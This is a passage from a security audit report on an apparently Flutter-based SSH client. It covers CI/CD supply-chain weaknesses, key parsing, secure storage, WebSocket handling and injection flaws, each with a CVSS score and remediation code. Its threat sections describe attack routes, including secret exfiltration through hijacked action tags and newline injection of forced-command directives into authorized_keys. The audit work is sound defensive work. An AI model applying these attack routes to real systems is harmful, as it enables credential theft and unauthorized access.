- `actions/setup-java@v6`
- `subosito/flutter-action@v2`
- `dependabot/fetch-metadata@v3`

Mutable tags can be moved by upstream repository owners or hijacked if an action maintainer's account is compromised, allowing arbitrary code execution during workflow runs.

#### Exploit / Threat Mechanics
1. An attacker compromises the GitHub account of a third-party action maintainer (e.g. `subosito/flutter-action`).
2. The attacker modifies the `@v2` release tag to point to a commit containing a malicious Node.js script.
3. The next CI run in ShellLite checks out code and executes the compromised action, exfiltrating GitHub secrets, signing keys, and repository source code.

#### Impact Assessment
- **Confidentiality/Integrity**: High. Compromise of CI/CD supply chain and build integrity.

#### Concrete Remediation Guidance
Pin all GitHub Actions to their full immutable 40-character commit SHAs, accompanied by descriptive version comments:

```yaml
# Remediation: .github/workflows/ci.yml
- name: Checkout
  uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1

- name: Setup Flutter
  uses: subosito/flutter-action@2783a703d080dd417336f4762a3725058718182a # v2.16.0
```

---

### SEC-CRYPTO-01: Blind Catch-All Exception Swallowing Masks Malformed/Unsupported Keys as Incorrect Passphrase
- **Severity**: **Medium**
- **CVSS v3.1 Score**: **6.5** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L`)
- **OWASP Mobile (2024)**: M10: Insufficient Cryptography
- **CWE**: CWE-390: Detection of Error Condition Without Action, CWE-209: Generation of Error Message Containing Sensitive Information
- **Affected Component**: `lib/services/key_parser.dart:68-72`

#### Vulnerability Description & Root Cause
In `SSHKeyParser.parse`:
```dart
try {
  final keyPairs = SSHKeyPair.fromPem(trimmed, passphrase);
  if (keyPairs.isEmpty) {
    throw const InvalidKeyFormatException('No valid SSH keys found in PEM content.');
  }
  return keyPairs;
} on SSHKeyException {
  rethrow;
} on SSHKeyDecryptError {
  throw const InvalidKeyPassphraseException('Incorrect passphrase for SSH key.');
} catch (_) {
  throw const InvalidKeyPassphraseException('Incorrect passphrase for SSH key.');
}
```
The generic `catch (_)` block intercepts all unexpected exceptions (including `FormatException`, `UnsupportedError`, memory exhaustion, or corrupted ASN.1 structures) and rethrows them as `InvalidKeyPassphraseException`.

#### Exploit / Threat Mechanics
1. A user imports a corrupted, truncated, or unsupported key (e.g. unsupported cipher like AES-CBC or ed448).
2. The parser fails due to an invalid format or unsupported algorithm.
3. The UI presents "Incorrect passphrase for SSH key" instead of "Unsupported key algorithm".
4. The user repeatedly types passwords, believing their passphrase is wrong, masking underlying file corruption or cryptographic incompatibility.

#### Impact Assessment
- **Integrity**: Low. Misleading error reporting.
- **Availability**: Moderate. Denial of service for valid keys with minor formatting anomalies.

#### Concrete Remediation Guidance
Distinguish between decryption failures and syntax/format errors:

```dart
// Remediation: lib/services/key_parser.dart
} on SSHKeyException {
  rethrow;
} on SSHKeyDecryptError {
  throw const InvalidKeyPassphraseException('Incorrect passphrase for SSH key.');
} on FormatException catch (e) {
  throw InvalidKeyFormatException('Malformed key format: ${e.message}');
} catch (e) {
  throw InvalidKeyFormatException('Unable to parse private key: $e');
}
```

---

### SEC-STORAGE-02: Missing AndroidX EncryptedSharedPreferences and StrongBox KeyStore Configuration
- **Severity**: **Medium**
- **CVSS v3.1 Score**: **6.2** (`CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
- **OWASP Mobile (2024)**: M9: Insecure Data Storage, M1: Improper Credential Usage
- **CWE**: CWE-311: Missing Encryption of Sensitive Data
- **Affected Component**: `lib/services/storage_service.dart:19-24`

#### Vulnerability Description & Root Cause
In `StorageService._defaultSecureStorage`:
```dart
aOptions: AndroidOptions(
  resetOnError: false,
  migrateWithBackup: true,
  keyCipherAlgorithm: KeyCipherAlgorithm.RSA_ECB_OAEPwithSHA_256andMGF1Padding,
  storageCipherAlgorithm: StorageCipherAlgorithm.AES_GCM_NoPadding,
),
```
`encryptedSharedPreferences: true` is missing. Without `encryptedSharedPreferences`, older Android plugins or legacy implementations fallback to less secure XML storage mechanisms or fail to leverage AndroidX Security library guarantees. Furthermore, StrongBox KeyStore (`useStrongBox: true`) is not requested, missing dedicated tamper-resistant hardware security modules (HSMs) on supporting modern Android devices.

#### Exploit / Threat Mechanics
1. An attacker gains physical access to a rooted Android device or inspects backup files.
2. If fallback encryption keys are accessible outside the hardware-isolated StrongBox Keystore, secrets can be recovered offline.

#### Impact Assessment
- **Confidentiality**: High on physical device compromise.

#### Concrete Remediation Guidance
Enable `encryptedSharedPreferences: true` in `AndroidOptions`:

```dart
// Remediation: lib/services/storage_service.dart
aOptions: AndroidOptions(
  encryptedSharedPreferences: true,
  resetOnError: false,
  keyCipherAlgorithm: KeyCipherAlgorithm.RSA_ECB_OAEPwithSHA_256andMGF1Padding,
  storageCipherAlgorithm: StorageCipherAlgorithm.AES_GCM_NoPadding,
),
```

---

### SEC-CICD-03: Bypassing Gradle Dependency Verification via `--android-skip-build-dependency-validation`
- **Severity**: **Medium**
- **CVSS v3.1 Score**: **5.9** (`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`)
- **OWASP Mobile (2024)**: M2: Inadequate Supply Chain Security
- **CWE**: CWE-353: Missing Support for Integrity Check
- **Affected Component**: `.github/workflows/build-android.yml:69, 75`

#### Vulnerability Description & Root Cause
In `.github/workflows/build-android.yml`:
```yaml
- name: Build Android Release APK
  run: |
    flutter build apk --release --android-skip-build-dependency-validation --build-name="${{ inputs.version }}" ...

- name: Build Android App Bundle (AAB)
  run: |
    flutter build appbundle --release --android-skip-build-dependency-validation --build-name="${{ inputs.version }}" ...
```
The `--android-skip-build-dependency-validation` flag explicitly disables Flutter's Gradle dependency verification and repository checksum validation.

#### Exploit / Threat Mechanics
1. A dependency repository or transitively resolved Gradle plugin is compromised or subject to a DNS/BGP hijacking attack against a Maven mirror.
2. Gradle downloads a modified, backdoored JAR or AAR dependency.
3. Because dependency validation is skipped, Gradle builds the release APK/AAB with the malicious payload included, resulting in compromised production binaries.

#### Impact Assessment
- **Integrity**: Critical. Malicious code injected into release builds distributed to end users.

#### Concrete Remediation Guidance
Remove `--android-skip-build-dependency-validation` and enable Gradle Dependency Verification with cryptographic checksum metadata (`gradle/verification-metadata.xml`).

---

### SEC-STORAGE-03: Silent Exception Suppression in Secure Storage Operations Leading to Orphaned Secrets and Data Loss
- **Severity**: **Medium**
- **CVSS v3.1 Score**: **5.9** (`CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L`)
- **OWASP Mobile (2024)**: M9: Insecure Data Storage, M10: Insufficient Cryptography
- **CWE**: CWE-391: Unchecked Error Condition, CWE-755: Improper Handling of Exceptional Conditions
- **Affected Component**: 
  - `lib/services/storage_service.dart:88-95, 129-145`
  - `lib/providers/server_store.dart:86-97`

#### Vulnerability Description & Root Cause
In `StorageService.saveCredential`:
```dart
try {
  await _secureStorage
      .write(key: tag, value: value)
      .timeout(storageTimeout);
} catch (e) {
  debugPrint('StorageService.saveCredential secureStorage fallback to in-memory: $e');
}
```
If writing to the platform KeyStore/Keychain throws an exception (e.g. storage full, locked keychain, or hardware timeout), the exception is swallowed. The credential remains only in `_inMemoryCredentials`. When the app is terminated or restarted, the credential is gone.

Similarly, in `deleteCredential`:
```dart
try {
  await _secureStorage.delete(key: tag).timeout(storageTimeout);
} catch (e) {
  debugPrint('StorageService.deleteCredential error: $e');
}
```
If deleting from secure storage fails, the in-memory map removes the tag, but the secret remains permanently written in hardware storage, resulting in orphaned private keys and passwords.

#### Exploit / Threat Mechanics
1. A user updates or deletes a server profile.
2. A transient KeyStore error causes deletion to fail silently.
3. The user assumes the credential is destroyed, but it persists on the device filesystem indefinitely.

#### Impact Assessment
- **Integrity/Availability**: High. User data lost silently upon restart.
- **Confidentiality**: Low/Moderate. Orphaned secrets left on disk.

#### Concrete Remediation Guidance
Propagate storage exceptions to caller or return an explicit `Result<T>` type so UI providers can inform the user and abort profile state changes.

---

### SEC-CRYPTO-03: Flawed Global Substring Search in `isEncrypted` Causes Denial of Service on Unencrypted Keys
- **Severity**: **Medium**
- **CVSS v3.1 Score**: **5.5** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H`)
- **OWASP Mobile (2024)**: M10: Insufficient Cryptography
- **CWE**: CWE-20: Improper Input Validation
- **Affected Component**: `lib/services/key_parser.dart:33-43`

#### Vulnerability Description & Root Cause
In `SSHKeyParser.isEncrypted`:
```dart
static bool isEncrypted(String pem) {
  final trimmed = pem.trim();
  if (trimmed.contains('ENCRYPTED') || trimmed.contains('Proc-Type: 4,ENCRYPTED')) {
    return true;
  }
  // ...
}
```
The method executes a global substring search for the string `ENCRYPTED`. If an unencrypted key contains the word `ENCRYPTED` in its comment field (e.g. `ssh-ed25519 AAA... admin@ENCRYPTED-VPC`) or if the Base64 ciphertext happens to contain the sequence `ENCRYPTED`, `isEncrypted` returns `true`.

#### Exploit / Threat Mechanics
1. A user imports a valid, unencrypted OpenSSH private key with comment `user@encrypted-bastion`.
2. `isEncrypted` returns `true`.
3. `SSHKeyParser.parse` demands a passphrase (`EncryptedKeyException: Passphrase required`).
4. Because the key is unencrypted, entering any passphrase fails decryption. The user is completely unable to authenticate with their legitimate key.

#### Impact Assessment
- **Availability**: High for affected keys (Denial of Service).

#### Concrete Remediation Guidance
Inspect headers strictly using anchored regular expressions rather than global string containment:

```dart
// Remediation: lib/services/key_parser.dart
static bool isEncrypted(String pem) {
  final trimmed = pem.trim();
  // Check PEM header lines only
  final lines = trimmed.split('\n');
  for (final line in lines) {
    final l = line.trim();
    if (l.startsWith('-----BEGIN') && l.contains('ENCRYPTED PRIVATE KEY')) {
      return true;
    }
    if (l.startsWith('Proc-Type:') && l.contains('ENCRYPTED')) {
      return true;
    }
  }
  try {
    return SSHKeyPair.isEncryptedPem(trimmed);
  } catch (_) {
    return _checkOpenSSHIsEncrypted(trimmed);
  }
}
```

---

### SEC-CRYPTO-05: Generated SSH Private Keys Lack Passphrase Protection and Are Exposed Plaintext in UI
- **Severity**: **Medium**
- **CVSS v3.1 Score**: **5.5** (`CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N`)
- **OWASP Mobile (2024)**: M9: Insecure Data Storage, M10: Insufficient Cryptography
- **CWE**: CWE-312: Cleartext Storage of Sensitive Information
- **Affected Component**: 
  - `lib/services/key_generator_service.dart:24-65`
  - `lib/screens/server_form_screen.dart:150-160`

#### Vulnerability Description & Root Cause
`SSHKeyGeneratorService.generateEd25519()` supports generating only unencrypted private keys (`cipherName: 'none'`, `kdfName: 'none'`). In `server_form_screen.dart:150-160`, when a user taps "Generate New Key", the unencrypted PEM string is populated into the text field, and `_obscureKey` is explicitly set to `false`, rendering the entire private key in cleartext on screen.

#### Exploit / Threat Mechanics
1. A user generates an SSH key on their mobile device in a public or office environment.
2. Shoulder surfing or screen recording captures the private key immediately.
3. The key is stored unencrypted at rest without an option to mandate a passphrase.

#### Impact Assessment
- **Confidentiality**: High. Private key exposure via UI and unencrypted key format.

#### Concrete Remediation Guidance
1. Keep `_obscureKey = true` by default.
2. Add support for encrypting generated keys using AES-256-CTR / bcrypt KDF with a user-provided passphrase.

---

### SEC-STORAGE-04: Indefinite In-Memory Credential Retention and Eager Telemetry Fetching
- **Severity**: **Medium**
- **CVSS v3.1 Score**: **5.5** (`CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
- **OWASP Mobile (2024)**: M9: Insecure Data Storage, M1: Improper Credential Usage
- **CWE**: CWE-226: Sensitive Information in Resource Not Removed Before Reuse
- **Affected Component**: 
  - `lib/services/storage_service.dart:30`
  - `lib/screens/server_list_screen.dart:94-103`

#### Vulnerability Description & Root Cause
In `StorageService`:
```dart
final Map<String, String> _inMemoryCredentials = {};
```
Whenever a credential is saved or retrieved, it is cached in `_inMemoryCredentials` and remains there for the lifetime of the application process. Combined with `server_list_screen.dart:94-103` (pull-to-refresh eagerly fetches telemetry for every saved profile, pulling all credentials into memory), all saved passwords and private keys reside in memory indefinitely.

#### Exploit / Threat Mechanics
1. An attacker obtains a memory dump, core dump, or inspects process memory on a compromised device.
2. All server credentials ever loaded are present in plain memory.

#### Impact Assessment
- **Confidentiality**: High in memory forensics.

#### Concrete Remediation Guidance
Implement an expiration timeout or eviction policy for `_inMemoryCredentials` (e.g. 5 minutes idle eviction) and purge cache when the application lifecycle transitions to the background (`AppLifecycleState.paused`).

---

### SEC-CICD-04: Keystore Credential Residue on Self-Hosted Runners and Secrets Inheritance on PRs
- **Severity**: **Medium**
- **CVSS v3.1 Score**: **5.5** (`CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N`)
- **OWASP Mobile (2024)**: M8: Security Misconfiguration
- **CWE**: CWE-226: Sensitive Information in Resource Not Removed Before Reuse
- **Affected Component**: 
  - `.github/workflows/build-android.yml:23, 50-64`
  - `.github/workflows/ci.yml:57`

#### Vulnerability Description & Root Cause
In `.github/workflows/build-android.yml`:
```bash
echo "$ANDROID_KEYSTORE_BASE64" | base64 -d > android/upload-keystore.jks
printf "%s\n" "storePassword=$ANDROID_KEYSTORE_PASSWORD" ... > android/key.properties
```
The keystore and password files are written directly into the working directory. If `runs-on` targets a persistent self-hosted runner (`vars.UBUNTU_RUNNER`), there is no post-job cleanup step. The files persist on the disk of the runner.
Furthermore, in `.github/workflows/ci.yml:57`:
```yaml
build-android:
  uses: ./.github/workflows/build-android.yml
  secrets: inherit
```
`secrets: inherit` passes all repository secrets into the workflow, even when triggered by pull requests from internal branches.

#### Exploit / Threat Mechanics
1. A release build runs on a self-hosted runner.
2. A subsequent unprivileged build or user on the runner reads `upload-keystore.jks` and `key.properties`.
3. The production Google Play release signing key is permanently compromised.

#### Impact Assessment
- **Confidentiality/Integrity**: High. Code signing key theft.

#### Concrete Remediation Guidance
Add a guaranteed cleanup step using `always()` condition in `build-android.yml`:

```yaml
- name: Clean Keystore Artifacts
  if: always()
  run: |
    rm -f android/upload-keystore.jks android/app/upload-keystore.jks
    rm -f android/key.properties android/app/key.properties
```

---

### SEC-NET-04: Broadcast Stream Race Condition Causing Silent Packet Loss in WebSocketSSHSocket
- **Severity**: **Medium**
- **CVSS v3.1 Score**: **5.3** (`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:H`)
- **OWASP Mobile (2024)**: M8: Security Misconfiguration
- **CWE**: CWE-662: Improper Synchronization
- **Affected Component**: `lib/services/web_ssh_socket.dart:10, 16-37, 56`

#### Vulnerability Description & Root Cause
In `WebSocketSSHSocket`:
```dart
final StreamController<Uint8List> _streamController = StreamController<Uint8List>.broadcast();
```
`_streamController` is initialized as a `.broadcast()` controller. A broadcast stream controller does NOT buffer events when there are no active listeners. If the WebSocket server transmits the SSH banner or initial key exchange packet before `dartssh2` attaches its listener to `socket.stream`, those packets are dropped.

#### Exploit / Threat Mechanics
1. High-speed network or local proxy sends `SSH-2.0-OpenSSH_9.0\r\n` immediately upon WebSocket connection.
2. `dartssh2` is still executing asynchronous setup.
3. The broadcast controller discards the incoming packets.
4. SSH key exchange hangs and times out.

#### Impact Assessment
- **Availability**: High for web SSH connections.

#### Concrete Remediation Guidance
Use a single-subscription `StreamController<Uint8List>()` which buffers incoming chunks until a listener subscribes:

```dart
// Remediation: lib/services/web_ssh_socket.dart
final StreamController<Uint8List> _streamController = StreamController<Uint8List>();
```

---

### SEC-NET-05: Half-Close Resource Leakage, Unhandled Stream Errors & Silent Text Frame Dropping in WebSocketSSHSocket
- **Severity**: **Medium**
- **CVSS v3.1 Score**: **5.3** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L`)
- **OWASP Mobile (2024)**: M8: Security Misconfiguration
- **CWE**: CWE-404: Improper Resource Shutdown or Release
- **Affected Component**: `lib/services/web_ssh_socket.dart:18-25, 39-46, 65-73`

#### Vulnerability Description & Root Cause
1. In `WebSocketSSHSocket`:
   ```dart
   if (data is Uint8List) { ... }
   else if (data is List<int>) { ... }
   else if (data is ByteBuffer) { ... }
   ```
   If the WebSocket bridge sends text frames (`String`), the data is silently ignored and dropped without warning.
2. In `_sinkSub`:
   ```dart
   _sinkSub = _sinkController.stream.listen((data) {
     _channel.sink.add(Uint8List.fromList(data));
   }, onDone: () { _channel.sink.close(); });
   ```
   There is no `onError` handler; sink errors trigger unhandled asynchronous errors.
3. In `close()`:
   Both sink and stream controllers are closed abruptly without flushing in-flight bytes, violating half-close requirements.

#### Impact Assessment
- **Integrity**: Packet loss if text frames are received.
- **Availability**: Unhandled stream errors crashing session.

#### Concrete Remediation Guidance
Convert String text frames to UTF-8 bytes, register `onError` on sink listeners, and await sink closing cleanly.

---

### SEC-CRYPTO-04: Lack of Sensitive Memory Zeroization and Prolonged Credential Retention in VM Garbage Collection Heap
- **Severity**: **Medium**
- **CVSS v3.1 Score**: **4.7** (`CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N`)
- **OWASP Mobile (2024)**: M9: Insecure Data Storage, M10: Insufficient Cryptography
- **CWE**: CWE-226: Sensitive Information in Resource Not Removed Before Reuse
- **Affected Component**: 
  - `lib/services/key_generator_service.dart:26-53`
  - `lib/services/storage_service.dart:30`

#### Vulnerability Description & Root Cause
In `SSHKeyGeneratorService.generateEd25519()`, private key bytes (`signingKey.asTypedList`, `privBuf`) are allocated as standard Dart `Uint8List` and string objects. In Dart, strings and typed data are managed by the garbage collector without memory pinning or guaranteed zeroization. They linger in memory pages indefinitely until collected and overwritten.

#### Exploit / Threat Mechanics
1. An adversary acquires a device core dump or uses process memory inspection tools (Frida).
2. The adversary scans heap pages for OpenSSH private key headers or Ed25519 seed byte patterns.

#### Impact Assessment
- **Confidentiality**: Moderate in high-threat environments.

#### Concrete Remediation Guidance
Explicitly overwrite sensitive `Uint8List` buffers with zeroes (`buffer.fillRange(0, buffer.length, 0)`) immediately after wire encoding is complete.

---

### SEC-INJECT-03: Shell Tilde Expansion Invalidation in Remote Upload Directory Resolution
- **Severity**: **Low**
- **CVSS v3.1 Score**: **4.6** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L`)
- **OWASP Mobile (2024)**: M4: Insufficient Input/Output Validation
- **CWE**: CWE-20: Improper Input Validation
- **Affected Component**: `lib/services/file_transfer_service.dart:197-207, 213`

#### Vulnerability Description & Root Cause
In `FileTransferService._uploadViaCat`:
```dart
var targetDir = remoteDirectory.trim();
if (targetDir.isEmpty || targetDir == '~') {
  targetDir = await resolveCurrentDirectory(client);
}
// ...
final remotePath = targetDir == '/' ? '/${item.name}' : '$targetDir/${item.name}';
final escapedPath = remotePath.replaceAll("'", "'\\''");
final session = await client.execute("cat > '$escapedPath'");
```
If a user specifies `~/backups`, `targetDir` remains `~/backups`. When quoted as `cat > '~/backups/file.txt'`, the shell **does not expand the tilde (`~`)** inside quotes. The operation fails with "No such file or directory" or creates a literal folder named `~`.

#### Impact Assessment
- **Integrity/Availability**: User cannot upload to tilde-prefixed paths.

#### Concrete Remediation Guidance
Expand leading `~` or `~/` to the remote home directory path resolved via `resolveCurrentDirectory(client)` prior to quoting.

---

### SEC-NET-06: Dangling Asynchronous Socket Execution & Server Connection Flooding in TelemetryService
- **Severity**: **Low**
- **CVSS v3.1 Score**: **4.3** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L`)
- **OWASP Mobile (2024)**: M8: Security Misconfiguration
- **CWE**: CWE-400: Uncontrolled Resource Consumption
- **Affected Component**: 
  - `lib/services/telemetry_service.dart:20-26`
  - `lib/screens/server_list_screen.dart:98-102`

#### Vulnerability Description & Root Cause
In `TelemetryService.fetchTelemetry()`:
```dart
return _fetchWithTimeout(profile, storageService).timeout(
  totalTimeout,
  onTimeout: () {
    debugPrint('TelemetryService: Quick timeout reached for ${profile.host}');
    return null;
  },
);
```
In Dart, `.timeout()` completes the returned future with `null`, but **it does not cancel the underlying asynchronous task**. `_fetchWithTimeout` continues running in the background, consuming sockets, threads, and attempting SSH handshakes. On server lists with multiple profiles, rapid refreshes trigger hundreds of unmanaged concurrent background connections.

#### Impact Assessment
- **Availability**: Resource exhaustion on mobile client and target servers.

#### Concrete Remediation Guidance
Implement an explicit cancellation mechanism or manage socket cleanup directly in `onTimeout`.

---

### SEC-STORAGE-06: Sub-optimal iOS Keychain Accessibility Setting Exposing Secrets During Device Lock (AFU State)
- **Severity**: **Low**
- **CVSS v3.1 Score**: **4.2** (`CVSS:3.1/AV:P/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N`)
- **OWASP Mobile (2024)**: M9: Insecure Data Storage
- **CWE**: CWE-522: Insufficiently Protected Credentials
- **Affected Component**: `lib/services/storage_service.dart:16`

#### Vulnerability Description & Root Cause
In `StorageService`:
```dart
iOptions: IOSOptions(
  accessibility: KeychainAccessibility.first_unlock_this_device,
  synchronizable: false,
),
```
`KeychainAccessibility.first_unlock_this_device` corresponds to `kSecAttrAccessibleAfterFirstUnlock`. In this state, once an iOS device is unlocked once following a boot, the cryptographic keys protecting the Keychain item remain in OS memory even when the device is locked (AFU state). Forensic extraction tools (e.g. Cellebrite) can extract AFU secrets without passcode knowledge.

#### Impact Assessment
- **Confidentiality**: High if the physical device is seized while locked in AFU state.

#### Concrete Remediation Guidance
Upgrade accessibility to `KeychainAccessibility.unlocked_this_device` (`kSecAttrAccessibleWhenUnlockedThisDeviceOnly`).

---

### SEC-CRYPTO-02: Sensitive Parsing Details Leaked in UI and Debug Logs via Unsanitized Exception Formatting
- **Severity**: **Low**
- **CVSS v3.1 Score**: **3.3** (`CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N`)
- **OWASP Mobile (2024)**: M10: Insufficient Cryptography
- **CWE**: CWE-209: Generation of Error Message Containing Sensitive Information
- **Affected Component**: 
  - `lib/services/key_parser.dart:82-84`
  - `lib/screens/server_form_screen.dart:132, 830`

#### Vulnerability Description & Root Cause
In `key_parser.dart`: `throw InvalidKeyFormatException('Failed to parse key: $e');`. In `server_form_screen.dart:132`:
`setState(() => _keyValidationError = e.toString().replaceAll('SSHKeyException: ', ''));`
Raw exception descriptions containing internal buffer indexes, ASN.1 parsing offsets, or system paths are reflected directly on the UI form screen and in system logs.

#### Impact Assessment
- **Confidentiality**: Low. Leaks internal structure details.

#### Concrete Remediation Guidance
Map low-level parser exceptions to sanitized, user-friendly error strings.

---

### SEC-INJECT-04: Unanchored & Permissive Clipboard Parsing Causing Target Misconfiguration & Option Confusion
- **Severity**: **Low**
- **CVSS v3.1 Score**: **3.3** (`CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N`)
- **OWASP Mobile (2024)**: M4: Insufficient Input/Output Validation
- **CWE**: CWE-20: Improper Input Validation
- **Affected Component**: `lib/screens/server_form_screen.dart:274-282`

#### Vulnerability Description & Root Cause
In `_parseClipboard`:
```dart
final regex = RegExp(
  r'(?:ssh\s+)?(?:-p\s*(?<port>\d+)\s+)?(?:-i\s*\S+\s+)?(?:(?<user>[a-zA-Z0-9._-]+)@)?(?<host>[a-zA-Z0-9.-]+)(?:\s+-p\s*(?<port2>\d+))?',
);
```
The regex lacks start/end anchors (`^...$`). When a user taps "Paste from Clipboard", any arbitrary text block containing a match anywhere in its body will match. If the clipboard contains multiple options, flags like `-o ProxyCommand=...` are ignored while matching unintended substrings.

#### Impact Assessment
- **Integrity**: Low. Accidental form misconfiguration.

#### Concrete Remediation Guidance
Anchor the expression and validate the entirety of the copied command line.

---

### SEC-STORAGE-05: Incomplete Credential Cleanup on Profile Update / Deletion (Passphrase Tag Residue)
- **Severity**: **Low**
- **CVSS v3.1 Score**: **3.3** (`CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`)
- **OWASP Mobile (2024)**: M9: Insecure Data Storage
- **CWE**: CWE-404: Improper Resource Shutdown or Release
- **Affected Component**: `lib/providers/server_store.dart:86-97`

#### Vulnerability Description & Root Cause
In `ServerStore.updateProfile`, if a profile changes from `SSHKeyAuth` to `PasswordAuth`, or if `credentialTag` is regenerated, only `passphraseTag` is deleted; the original `privateKeyTag` is never deleted from secure storage. Over time, deleted and updated profiles leave orphaned cryptographic keys in the device KeyStore.

#### Impact Assessment
- **Confidentiality**: Low. Orphaned private keys remain stored.

#### Concrete Remediation Guidance
Ensure `oldProfile.authMethod.credentialTag` is deleted whenever the authentication method or tag changes.

---

### SEC-REPO-01: Historical Commit Secret Residue - Deleted Live SSH Test File Retained in Commit Graph
- **Severity**: **Low**
- **CVSS v3.1 Score**: **3.3** (`CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`)
- **OWASP Mobile (2024)**: M8: Security Misconfiguration
- **CWE**: CWE-312: Cleartext Storage of Sensitive Information
- **Affected Component**: Git history `38b48a0`, `8281d64`

#### Vulnerability Description & Root Cause
A live SSH test integration file or private key fixture was committed in historical git commits (`38b48a0`, `8281d64`) and subsequently deleted via `git rm`. The file remains in the git object database and can be retrieved via `git log -p` or `git checkout`.

#### Impact Assessment
- **Confidentiality**: Low (if test key) / High (if production key).

#### Concrete Remediation Guidance
Run `git-filter-repo` or BFG Repo-Cleaner to permanently scrub the test files from history, and rotate any test credentials.

---

### SEC-CRYPTO-06: Unsanitized Public Key Comment Parameter Permits Multiline Injection in `authorized_keys`
- **Severity**: **Low**
- **CVSS v3.1 Score**: **3.1** (`CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:N/I:L/A:N`)
- **OWASP Mobile (2024)**: M7: Client-Side Injection
- **CWE**: CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')
- **Affected Component**: `lib/services/key_generator_service.dart:36, 46`

#### Vulnerability Description & Root Cause
In `SSHKeyGeneratorService.generateEd25519()`:
```dart
final pubOpenSSH = 'ssh-ed25519 ${base64.encode(pubBlob)} $comment';
```
If `comment` contains newline characters (`\n` or `\r`), an attacker who controls the comment can inject new lines into the resulting `pubOpenSSH` string. When the user copies the public key or pastes it into `~/.ssh/authorized_keys`, the injected lines act as separate authorization lines, allowing forced commands (`command="malicious_cmd"`) or secondary attacker public keys.

#### Impact Assessment
- **Integrity**: Low/Moderate. Malicious directive injection into `authorized_keys`.

#### Concrete Remediation Guidance
Sanitize `comment` by stripping all newline (`\r`, `\n`) and control characters:

```dart
// Remediation: lib/services/key_generator_service.dart
final cleanComment = comment.replaceAll(RegExp(r'[\r\n\x00]'), '').trim();
```

---

### SEC-CICD-05: Excessive Top-Level Permissions Violating Principle of Least Privilege
- **Severity**: **Low**
- **CVSS v3.1 Score**: **2.0** (`CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:N`)
- **OWASP Mobile (2024)**: M8: Security Misconfiguration
- **CWE**: CWE-250: Execution with Unnecessary Privileges
- **Affected Component**: 
  - `.github/workflows/release.yml:23-24`
  - `.github/workflows/dependabot-auto-merge.yml:8-10`

#### Vulnerability Description & Root Cause
Workflows declare broad top-level permissions:
```yaml
permissions:
  contents: write
  pull-requests: write
```
This violates the principle of least privilege. Permissions should be scoped at the individual job level rather than globally for the entire workflow.

#### Impact Assessment
- **Integrity**: Low. Unnecessary privilege exposure in CI.

#### Concrete Remediation Guidance
Set global permissions to `contents: read`, and assign `write` permissions only to the specific jobs that create releases or merge PRs.

---

### SEC-CICD-06: Unauthenticated Dependabot PR Auto-Merge Without Semver Validation on Manual Dispatch
- **Severity**: **Low**
- **CVSS v3.1 Score**: **2.0** (`CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:N`)
- **OWASP Mobile (2024)**: M2: Inadequate Supply Chain Security
- **CWE**: CWE-829: Inclusion of Functionality from Untrusted Control Sphere
- **Affected Component**: `.github/workflows/dependabot-auto-merge.yml:35-48`

#### Vulnerability Description & Root Cause
In `dependabot-auto-merge.yml`, the `workflow_dispatch` trigger:
```bash
PRS=$(gh pr list --app dependabot --json number --jq '.[].number')
for PR in $PRS; do
  gh pr review --approve "$PR" || true
  gh pr merge --auto --squash "$PR" || true
done
```
This approves and merges ALL open Dependabot PRs without evaluating whether they contain breaking major version bumps (`semver-major`) or pass CI validation.

#### Impact Assessment
- **Integrity**: Low. Breaking or malicious package versions merged into `main` without inspection.

#### Concrete Remediation Guidance
Enforce semver evaluation on manual dispatch, restricting auto-merges to `semver-minor` and `semver-patch`.

---

### SEC-DEP-01: Legacy Transitive Dependency `zmodem` (0.0.6) and Zero-Major Caret Ranges
- **Severity**: **Informational**
- **CVSS v3.1 Score**: **3.7** (`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N`)
- **OWASP Mobile (2024)**: M2: Inadequate Supply Chain Security
- **CWE**: CWE-1104: Use of Unmaintained Third-Party Components
- **Affected Component**: 
  - `pubspec.lock:736-743`
  - `pubspec.yaml:19`

#### Vulnerability Description & Root Cause
1. `pubspec.lock` pulls in `zmodem: 0.0.6`, a transitive dependency from `xterm.dart`. The `zmodem` package has been unmaintained since 2017.
2. In `pubspec.yaml`, `pinenacl: ^0.6.0` uses a caret range on a zero-major (`0.x.x`) dependency. In Dart semver, `^0.6.0` locks to `<0.7.0`, but breaking changes frequently occur in 0.x releases.

#### Remediation Guidance
Audit `xterm` usage to determine if ZMODEM file transfers can be tree-shaken, and pin `pinenacl` to exact version `0.6.0`.

---

### SEC-STATIC-01: Static Analysis Lacks `--fatal-infos` Flag in CI Workflow
- **Severity**: **Informational**
- **CVSS v3.1 Score**: **0.0**
- **OWASP Mobile (2024)**: M8: Security Misconfiguration
- **CWE**: CWE-390: Detection of Error Condition Without Action
